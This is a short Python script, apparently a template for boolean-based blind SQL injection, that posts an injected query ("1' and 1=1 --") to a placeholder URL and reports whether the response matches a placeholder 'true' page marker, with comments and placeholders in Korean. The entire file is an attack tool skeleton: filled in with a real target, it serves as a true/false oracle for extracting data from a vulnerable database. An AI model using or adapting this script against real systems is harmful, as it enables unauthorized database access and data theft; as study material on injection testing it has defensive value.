import requests


def httpreq(query):
	url = "url"
	data = {'POST data 변수' : ""+query+"" } #METHOD : POST
	res = requests.post(url=url, data=data)
	html=res.text
	if(html.find('참 일때 나타나는 화면 값')>0):
		return 1
	else:
		return 0

query = "1' and 1=1 --" #Insert Injection Query
count = httpreq(query)
if(count):
	print count
else:
	print count
